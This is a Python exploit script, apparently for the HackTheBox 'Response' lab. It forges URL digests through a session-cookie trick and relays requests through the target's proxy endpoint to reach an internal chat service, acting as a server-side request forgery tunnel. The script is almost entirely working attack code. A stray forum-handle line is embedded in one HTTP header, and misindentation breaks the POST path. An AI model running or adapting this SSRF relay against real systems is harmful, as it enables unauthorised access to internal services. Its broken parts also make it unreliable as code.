import socket
from requests import *
import json
import base64
import urllib

url = "http://api.response.htb/"


def get(url, body=""):
    if not body == "":
        data = {
            "url": url,
            "url_digest": url_de(url),
            "method": "POST",
            "session": "5f7bf45b02c832cf5b40c15ab6d365af",
            "session_digest": "a2b9ac69ab85795d13d12857a709a024cd729dcdf2c3fd3bb21ed514bc9990ac",
            "body": base64.b64encode(body)
        }
        # print data
    else:
        data = {

            "url": url,
            "url_digest": url_de(url),
            "method": "GET",
            "session": "5f7bf45b02c832cf5b40c15ab6d365af",
            "session_digest": "a2b9ac69ab85795d13d12857a709a024cd729dcdf2c3fd3bb21ed514bc9990ac"
        }

        headers = {'Content-Type': 'application/json'}
        url_proxy = "http://proxy.response.htb/fetch"
        s = Session()
        res = s.post(url_proxy, json=data, headers=headers)
        try:
            body = json.loads(res.text)['body']
            body = base64.b64decode(body)
            return body
        except:
            return res.text

def url_de(url):
    s = Session()
    res = s.get('http://www.response.htb/status/main.js.php', cookies={'PHPSESSID': url})
    x = res.text.find("session_digest':'")
    y = res.text.find("'};")
    return res.text[x + 17:y]


echoSocket = socket.socket()
echoSocket.bind(("0.0.0.0", 80))
echoSocket.listen(10)
url = "http://chat.response.htb"
while (True):
    (clientSocket, clientAddress) = echoSocket.accept()
    while (True):
        data = clientSocket.recv(1024)
        print(data)
        pot = data[:4]
        sub = data.split(b" ")[1]
        if b"GET" in pot:
            v = get(url + str(sub))
            print(v)
            if b"socket.io" in sub:
                m = """HTTP/1.1 200 OK
Server: nginx/1.21.6
breached.to/User-BlackMoussiba

Date: Mon, 30 May 2022 23:33:26 GMT
Content-Type: application/text
Content-Length: %d
Access-Control-Allow-Origin: *
Connection: close

""" % len(v)
            else:
                if b".css" in sub:
                    typei = "css"
                elif b".js" in sub:
                    typei = "js"
                else:
                    typei = "html"

                m = """HTTP/1.1 200 OK

Server: nginx/1.21.6
Date: Mon, 30 May 2022 23:33:26 GMT
Content-Type: text/%s; charset=UTF-8
Content-Length: %d
Connection: close

""" % (typei, len(v))
            b = m + v
            clientSocket.send(b.encode())
            break
        else:
            body = data.split(b"\n")[-1]
            v = get(url + str(sub), str(body))
            if True:
                m = """HTTP/1.1 200 OK
Server: nginx/1.21.6
Date: Mon, 30 May 2022 23:33:26 GMT
Content-Type: application/text
Content-Length: %d
Connection: close
""" % len(v)
            m += v
            clientSocket.send(m.encode())
            break
